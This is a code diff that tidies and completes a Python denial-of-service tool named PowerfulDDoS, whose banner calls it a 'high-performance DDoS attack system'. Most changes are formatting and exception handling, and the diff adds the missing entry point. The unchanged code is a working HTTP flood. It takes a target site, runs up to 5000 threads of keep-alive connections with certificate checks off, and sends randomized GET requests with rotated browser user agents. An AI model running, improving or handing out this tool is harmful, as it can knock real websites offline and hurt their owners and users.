@@ -13,12 +13,12 @@ class PowerfulDDoS:
         self.target_host = ""
         self.port = 80
         self.duration = 300
-        self.threads = 2000  # Increased default for more power
+        self.threads = 1000          # Increased default for more power
         self.running = True
         self.requests_sent = 0
         self.lock = threading.Lock()
         self.start_time = None
-        
+
     def resolve_target(self, target):
         """Resolves hostname to IP for performance."""
         try:
@@ -31,56 +31,55 @@ class PowerfulDDoS:
     def get_user_input(self):
         os.system('clear' if os.name == 'posix' else 'cls')
         print("=" * 60)
-        print("  💀 HIGH-PERFORMANCE DDoS ATTACK SYSTEM 💀")
+        print(" 💀 HIGH-PERFORMANCE DDoS ATTACK SYSTEM 💀")
         print("=" * 60)
-        
+
         while True:
             target = input("🌐 Enter target website (example.com): ").strip().lower()
             if self.resolve_target(target):
                 break
             print("❌ Could not resolve domain! Try again.")
-        
+
         use_ssl = input("🔐 Use HTTPS? (y/n, default=y): ").strip().lower()
         self.port = 443 if use_ssl in ['', 'y', 'yes'] else 80
-        
+
         try:
             duration = input("⏱️ Attack duration in seconds (default=60): ").strip()
             self.duration = int(duration) if duration else 60
-        except:
+        except Exception:
             self.duration = 60
-            
+
         try:
             threads = input(f"⚡ Number of threads (100-5000, default=1000): ").strip()
             self.threads = max(100, min(5000, int(threads))) if threads else 1000
-        except:
+        except Exception:
             self.threads = 1000
-        
+
         print("\n" + "=" * 60)
         print(f"🎯 TARGET: {self.target_host} ({self.target_ip})")
         print(f"🔌 PORT: {self.port}")
         print(f"⏱️ DURATION: {self.duration} seconds")
         print(f"⚡ THREADS: {self.threads}")
         print("=" * 60)
-        
+
         confirm = input("🚀 Start attack? (y/n): ").strip().lower()
         if confirm not in ['y', 'yes']:
             print("❌ Attack cancelled.")
             sys.exit()
-            
+
     def create_socket(self):
         """Creates a single, reusable socket for the attack."""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
             s.connect((self.target_ip, self.port))
-            
             if self.port == 443:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=self.target_host)
             return s
-        except Exception as e:
+        except Exception:
             return None
 
     def flood(self):
@@ -91,7 +90,6 @@ class PowerfulDDoS:
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
         ]
-        
         paths = [
             "/", "/index.html", "/login", "/api/v1/data", "/search?q=test",
             "/wp-admin/", "/admin", "/images/logo.png", "/js/main.js", "/css/style.css"
@@ -108,10 +106,8 @@ class PowerfulDDoS:
                 for _ in range(random.randint(5, 15)):
                     if not self.running:
                         break
-                    
                     path = random.choice(paths)
                     user_agent = random.choice(user_agents)
-                    
                     payload = (
                         f"GET {path} HTTP/1.1\r\n"
                         f"Host: {self.target_host}\r\n"
@@ -122,16 +118,11 @@ class PowerfulDDoS:
                         f"Connection: keep-alive\r\n"
                         f"Cache-Control: no-cache\r\n\r\n"
                     )
-                    
                     sock.sendall(payload.encode())
-                    
                     with self.lock:
                         self.requests_sent += 1
-                    
-                    time.sleep(random.uniform(0.01, 0.05)) # Small random delay
-                
+                    time.sleep(random.uniform(0.01, 0.05))  # Small random delay
                 sock.close()
-
             except Exception:
                 # If anything fails, just continue to the next iteration
                 pass
@@ -141,17 +132,17 @@ class PowerfulDDoS:
         print(f"\n🚀 Starting high-performance attack on {self.target_host}:{self.port}")
         print(f"⚡ {self.threads} threads | {self.duration} seconds duration")
         print("💀 Attack in progress... Press Ctrl+C to stop\n")
-        
+
         # Start the status reporting thread
         status_thread = threading.Thread(target=self.print_status)
         status_thread.daemon = True
         status_thread.start()
-        
+
         # Start the attack threads
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             for _ in range(self.threads):
                 executor.submit(self.flood)
-        
+
         # Timer to stop the attack
         time.sleep(self.duration)
         self.stop()
@@ -169,11 +160,10 @@ class PowerfulDDoS:
 
     def stop(self):
         self.running = False
-        time.sleep(1.1) # Allow last status print
+        time.sleep(1.1)  # Allow last status print
         end_time = time.time()
         elapsed = end_time - self.start_time
         rps = int(self.requests_sent / elapsed) if elapsed > 0 else 0
-        
         print("\n" + "=" * 60)
         print("💀 ATTACK COMPLETED")
         print("=" * 60)
@@ -186,8 +176,11 @@ class PowerfulDDoS:
 def main():
     attack = PowerfulDDoS()
     attack.get_user_input()
-    
     try:
         attack.start()
     except KeyboardInterrupt:
-        print("\n
+        print("\n💀 Attack interrupted by user.")
+        attack.stop()
+
+if __name__ == "__main__":
+    main()
